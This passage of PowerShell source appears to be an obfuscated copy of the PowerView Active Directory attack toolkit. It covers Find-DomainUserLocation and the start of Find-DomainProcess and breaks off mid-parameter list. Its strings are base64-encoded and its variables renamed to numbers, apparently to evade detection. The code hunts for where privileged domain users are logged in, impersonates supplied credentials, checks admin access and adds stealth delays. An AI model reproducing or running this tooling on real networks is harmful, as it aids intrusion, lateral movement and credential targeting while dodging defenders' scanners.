        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGMAbwBuAHMAdAByAGEAaQBuAGUAZAA=')))] = ${f5} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE8AcABlAHIAYQB0AGkAbgBnAFMAeQBzAHQAZQBtAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TwBwAGUAcgBhAHQAaQBuAGcAUwB5AHMAdABlAG0A')))] = ${f4} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQByAHYAaQBjAGUAUABhAGMAawA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBpAGMAZQBQAGEAYwBrAA==')))] = ${f3} }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAaQB0AGUATgBhAG0AZQA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))] = $SiteName }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${96}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${110} = @{
            'Properties' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBkAGUAbgB0AGkAdAB5AA==')))] = $UserIdentity }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $UserLDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))] = $UserAdminCount }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))] = $UserAllowDelegation }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${110}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${88} = @()
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA')))]) {
            ${88} = @(${94})
        }
        else {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AGUAYQBsAHQAaAA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFMAdABlAGEAbAB0AGgAIABlAG4AdQBtAGUAcgBhAHQAaQBvAG4AIAB1AHMAaQBuAGcAIABzAG8AdQByAGMAZQA6ACAAJABTAHQAZQBhAGwAdABoAFMAbwB1AHIAYwBlAA==')))
                ${126} = New-Object System.Collections.ArrayList
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAGwAZQB8AEEAbABsAA==')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZgBpAGwAZQAgAHMAZQByAHYAZQByAHMA')))
                    ${129} = @{}
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${129}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${129}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAFMAZQBhAHIAYwBoAEIAYQBzAGUA')))]) { ${129}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $ComputerSearchBase }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${129}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${129}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${129}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${129}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${129}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${129}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${128} = f90 @129
                    if (${128} -isnot [System.Array]) { ${128} = @(${128}) }
                    ${126}.AddRange( ${128} )
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABGAFMAfABBAGwAbAA=')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAARABGAFMAIABzAGUAcgB2AGUAcgBzAA==')))
                }
                if ($StealthSource -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAHwAQQBsAGwA')))) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAZABvAG0AYQBpAG4AIABjAG8AbgB0AHIAbwBsAGwAZQByAHMA')))
                    ${108} = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${108}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAEQAbwBtAGEAaQBuAA==')))]) { ${108}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $ComputerDomain }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${108}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
                    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${108}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
                    ${127} = f84 @108 | select -ExpandProperty dnshostname
                    if (${127} -isnot [System.Array]) { ${127} = @(${127}) }
                    ${126}.AddRange( ${127} )
                }
                ${88} = ${126}.ToArray()
            }
            else {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFEAdQBlAHIAeQBpAG4AZwAgAGYAbwByACAAYQBsAGwAIABjAG8AbQBwAHUAdABlAHIAcwAgAGkAbgAgAHQAaABlACAAZABvAG0AYQBpAG4A')))
                ${88} = f79 @96 | select -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $(${88}.Length)"
        if (${88}.Length -eq 0) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAGgAbwBzAHQAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAGUAbgB1AG0AZQByAGEAdABlAA==')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            ${115} = $Credential.GetNetworkCredential().UserName
        }
        else {
            ${115} = ([Environment]::UserName).ToLower()
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBoAG8AdwBBAGwAbAA=')))]) {
            ${103} = @()
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBJAGQAZQBuAHQAaQB0AHkA')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBMAEQAQQBQAEYAaQBsAHQAZQByAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGQAbQBpAG4AQwBvAHUAbgB0AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBBAGwAbABvAHcARABlAGwAZQBnAGEAdABpAG8AbgA=')))]) {
            ${103} = f71 @110 | select -ExpandProperty samaccountname
        }
        else {
            ${109} = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA=')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBTAGUAYQByAGMAaABCAGEAcwBlAA==')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $UserSearchBase }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${109}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
            ${103} = f85 @109 | select -ExpandProperty MemberName
        }
        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $(${103}.Length)"
        if ((-not $ShowAll) -and (${103}.Length -eq 0)) {
            throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAE4AbwAgAHUAcwBlAHIAcwAgAGYAbwB1AG4AZAAgAHQAbwAgAHQAYQByAGcAZQB0AA==')))
        }
        ${87} = {
            Param(${94}, ${103}, ${115}, $Stealth, ${f2})
            if (${f2}) {
                $Null = f77 -f2 ${f2} -f39
            }
            ForEach (${89} in ${94}) {
                ${93} = Test-Connection -Count 1 -Quiet -ComputerName ${89}
                if (${93}) {
                    ${125} = f89 -94 ${89}
                    ForEach (${124} in ${125}) {
                        ${120} = ${124}.UserName
                        ${122} = ${124}.CName
                        if (${122} -and ${122}.StartsWith('\\')) {
                            ${122} = ${122}.TrimStart('\')
                        }
                        if ((${120}) -and (${120}.Trim() -ne '') -and (${120} -notmatch ${115}) -and (${120} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                            if ( (-not ${103}) -or (${103} -contains ${120})) {
                                ${117} = New-Object PSObject
                                ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $Null
                                ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${120}
                                ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${89}
                                ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) ${122}
                                try {
                                    ${123} = [System.Net.Dns]::GetHostEntry(${122}) | select -ExpandProperty HostName
                                    ${117} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) ${123}
                                }
                                catch {
                                    ${117} | Add-Member NoteProperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                }
                                if ($CheckAccess) {
                                    ${118} = (f80 -94 ${122}).IsAdmin
                                    ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${118}.IsAdmin
                                }
                                else {
                                    ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                }
                                ${117}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                ${117}
                            }
                        }
                    }
                    if (-not $Stealth) {
                        ${121} = f88 -94 ${89}
                        ForEach (${f10} in ${121}) {
                            ${120} = ${f10}.UserName
                            $UserDomain = ${f10}.LogonDomain
                            if ((${120}) -and (${120}.trim() -ne '')) {
                                if ( (-not ${103}) -or (${103} -contains ${120}) -and (${120} -notmatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkACQA'))))) {
                                    ${119} = @(f87 -94 ${89})[0].IPAddress
                                    ${117} = New-Object PSObject
                                    ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                                    ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) ${120}
                                    ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAE4AYQBtAGUA'))) ${89}
                                    ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBQAEEAZABkAHIAZQBzAHMA'))) ${119}
                                    ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAA=='))) $Null
                                    ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHMAcwBpAG8AbgBGAHIAbwBtAE4AYQBtAGUA'))) $Null
                                    if ($CheckAccess) {
                                        ${118} = f80 -94 ${89}
                                        ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) ${118}.IsAdmin
                                    }
                                    else {
                                        ${117} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABvAGMAYQBsAEEAZABtAGkAbgA='))) $Null
                                    }
                                    ${117}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBVAHMAZQByAEwAbwBjAGEAdABpAG8AbgA='))))
                                    ${117}
                                }
                            }
                        }
                    }
                }
            }
            if (${f2}) {
                f75
            }
        }
        ${85} = $Null
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
                ${85} = f77 -Credential $Credential
            }
            else {
                ${85} = f77 -Credential $Credential -f39
            }
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABlAGwAYQB5AA==')))] -or $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AG8AcABPAG4AUwB1AGMAYwBlAHMAcwA=')))]) {
            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $(${88}.count)"
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAEQAZQBsAGEAeQA6ACAAJABEAGUAbABhAHkALAAgAEoAaQB0AHQAZQByADoAIAAkAEoAaQB0AHQAZQByAA==')))
            ${90} = 0
            ${91} = New-Object System.Random
            ForEach (${89} in ${88}) {
                ${90} = ${90} + 1
                sleep -Seconds ${91}.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
                Write-Verbose "[Find-DomainUserLocation] Enumerating server ${116} (${90} of $(${88}.Count))"
                icm -ScriptBlock ${87} -ArgumentList ${89}, ${103}, ${115}, $Stealth, ${85}
                if (${58} -and $StopOnSuccess) {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFQAYQByAGcAZQB0ACAAdQBzAGUAcgAgAGYAbwB1AG4AZAAsACAAcgBlAHQAdQByAG4AaQBuAGcAIABlAGEAcgBsAHkA')))
                    return
                }
            }
        }
        else {
            Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4AVQBzAGUAcgBMAG8AYwBhAHQAaQBvAG4AXQAgAFUAcwBpAG4AZwAgAHQAaAByAGUAYQBkAGkAbgBnACAAdwBpAHQAaAAgAHQAaAByAGUAYQBkAHMAOgAgACQAVABoAHIAZQBhAGQAcwA=')))
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $(${88}.Length)"
            ${86} = @{
                'TargetUsers' = ${103}
                'CurrentUser' = ${115}
                'Stealth' = $Stealth
                'TokenHandle' = ${85}
            }
            f76 -94 ${88} -f12 ${87} -f11 ${86} -Threads $Threads
        }
    }
    END {
        if (${85}) {
            f75 -f2 ${85}
        }
    }
}
function Find-DomainProcess {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DNSHostName')]
        [String[]]
        ${94},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerDomain,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerLDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String]
        $ComputerSearchBase,
        [Alias('Unconstrained')]
        [Switch]
        $ComputerUnconstrained,
        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $ComputerOperatingSystem,
        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $ComputerServicePack,
        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $ComputerSiteName,
        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ProcessName,
        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $UserIdentity,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $UserDomain,
        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
